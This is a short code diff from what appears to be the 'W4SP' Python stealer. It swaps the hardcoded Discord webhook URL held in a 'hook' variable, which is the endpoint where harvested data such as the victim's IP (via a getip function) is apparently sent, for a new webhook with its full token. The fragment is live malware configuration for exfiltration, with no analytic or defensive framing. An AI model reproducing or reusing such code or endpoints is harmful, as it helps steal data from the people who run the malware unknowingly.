@@ -20,7 +20,7 @@ import subprocess
 #    BY W4SP, loTus04
 
 
-hook = 'https://discord.com/api/webhooks/1091479735655223466/ibR-tnGW0MQ2p1Uz9M0UuXmC7-4v3wboErqXggYHM6mgAFIdSWn9xYaS5p4Brfpo90Av'
+hook = 'https://discord.com/api/webhooks/1104151274884169861/my4pnUfk_iheTqLGmvl6x9bKT6plUa7d4l2somEaYQcOGKLNGq3P7vHblnLEw2BTzsK_'
 
 
 def getip():
